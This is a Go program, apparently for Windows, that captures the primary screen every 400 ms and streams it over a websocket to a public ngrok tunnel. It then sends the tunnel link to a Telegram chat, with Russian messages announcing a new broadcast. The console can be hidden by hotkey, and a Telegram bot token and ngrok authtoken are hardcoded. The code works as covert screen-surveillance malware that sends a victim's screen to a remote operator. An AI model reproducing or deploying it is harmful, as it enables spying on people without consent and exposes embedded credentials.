package main

import (
	"bytes"
	"context"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html/template"
	"image"
	"image/png"
	"log"
	"net/http"

	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/eiannone/keyboard"
	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
	"golang.ngrok.com/ngrok"
	"golang.ngrok.com/ngrok/config"
)

type InlineKeyboardButton struct {
	Text string `json:"text"`
	URL  string `json:"url"`
}

type InlineKeyboardMarkup struct {
	InlineKeyboard [][]InlineKeyboardButton `json:"inline_keyboard"`
}

var (
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	procGetConsoleWindow = kernel32.NewProc("GetConsoleWindow")
	user32               = syscall.NewLazyDLL("user32.dll")
	procShowWindow       = user32.NewProc("ShowWindow")
	consoleVisible       int
)

func toggleConsole() {
	hwnd, _, _ := procGetConsoleWindow.Call()
	if hwnd == 0 {
		return
	}
	if consoleVisible == 0 {
		procShowWindow.Call(hwnd, 1)
		consoleVisible = 1
	} else {
		procShowWindow.Call(hwnd, 0)
		consoleVisible = 0
	}
}

func checkHotkey() {
	defer func() {
		_ = keyboard.Close()
	}()

	for {
		_, key, err := keyboard.GetSingleKey()
		if err != nil {
			panic(err)
		}

		if key == keyboard.KeyCtrlSpace {
			toggleConsole()
		}
	}
}

func sendTelegramMessageWithButton(buttonURL string) error {
	botToken := "7139011613:AAFU7H6YKKPUZFBtvprwknH8VJ5LvDF4Ukw"
	chatID := "-1002111741114"
	message := "Началась новая трансялция"
	buttonText := "Открыть в барузере"
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	keyboard := InlineKeyboardMarkup{
		InlineKeyboard: [][]InlineKeyboardButton{
			{
				{Text: buttonText, URL: buttonURL},
			},
		},
	}

	replyMarkup, err := json.Marshal(keyboard)
	if err != nil {
		return err
	}

	data := map[string]interface{}{
		"chat_id":      chatID,
		"text":         message,
		"reply_markup": string(replyMarkup),
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}

	resp, err := http.Post(apiURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to send message: %v", resp.Status)
	}

	return nil
}

//go:embed stream_template.html
var streamTemplate string

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
}

const (
	frameDelay = 400 * time.Millisecond
)

var (
	mu      sync.Mutex
	clients = make(map[*websocket.Conn]bool)
)

func capturePrimaryDisplay() image.Image {
	numDisplays := screenshot.NumActiveDisplays()
	if numDisplays == 0 {
		return nil
	}
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		log.Println("Error capturing screen:", err)
		return nil
	}
	return img
}

func sendVideoStream() {
	for {
		img := capturePrimaryDisplay()
		if img == nil {
			time.Sleep(frameDelay)
			continue
		}

		var imgBuf bytes.Buffer
		err := png.Encode(&imgBuf, img)
		if err != nil {
			log.Println("Error encoding image:", err)
			time.Sleep(frameDelay)
			continue
		}
		imgBase64 := base64.StdEncoding.EncodeToString(imgBuf.Bytes())

		mu.Lock()
		for client := range clients {
			if err := client.WriteMessage(websocket.TextMessage, []byte(imgBase64)); err != nil {
				log.Printf("Error sending image to client: %v", err)
				client.Close()
				delete(clients, client)
			}
		}
		mu.Unlock()

		time.Sleep(frameDelay)
	}
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		http.Error(w, "Could not open WebSocket connection", http.StatusBadRequest)
		return
	}
	defer conn.Close()

	mu.Lock()
	clients[conn] = true
	mu.Unlock()

	for {
		if _, _, err := conn.ReadMessage(); err != nil {
			mu.Lock()
			delete(clients, conn)
			mu.Unlock()
			break
		}
	}
}

func run(ctx context.Context) error {
	listener, err := ngrok.Listen(ctx,
		config.HTTPEndpoint(config.WithForwardsTo("localhost:8081")),
		ngrok.WithAuthtoken("2a1spZ5Tu8L7gSQAJaafnsG4bJc_2h9nDWzFKoZ3Z1qu7BLLu"),
	)
	if err != nil {
		log.Println("Error starting ngrok:", err)
		return err
	}

	appURL := listener.URL() + "/stream"
	log.Println("App URL", appURL)

	if err := sendTelegramMessageWithButton(appURL); err != nil {
		log.Println("Error sending message to Telegram:", err)
	}

	return http.Serve(listener, nil)
}

func main() {
	go func() {
		checkHotkey()
	}()

	// showConsole(false)

	tmpl, err := template.New("stream").Parse(streamTemplate)

	if err != nil {
		log.Fatal("Error parsing template:", err)
	}

	http.HandleFunc("/ws", wsHandler)

	http.HandleFunc("/stream", func(w http.ResponseWriter, r *http.Request) {
		wsURL := ""
		if strings.Contains(r.Host, ":") {
			wsURL = "ws://" + r.Host + "/ws"
		} else {
			wsURL = "wss://" + r.Host + "/ws"
		}
		if err := tmpl.Execute(w, struct{ WebSocketURL string }{WebSocketURL: wsURL}); err != nil {
			http.Error(w, "Error executing template", http.StatusInternalServerError)
		}
	})

	go func() {
		log.Fatal(http.ListenAndServe(":8081", nil))
	}()

	go sendVideoStream()

	if err := run(context.Background()); err != nil {
		log.Fatal(err)
	}
}
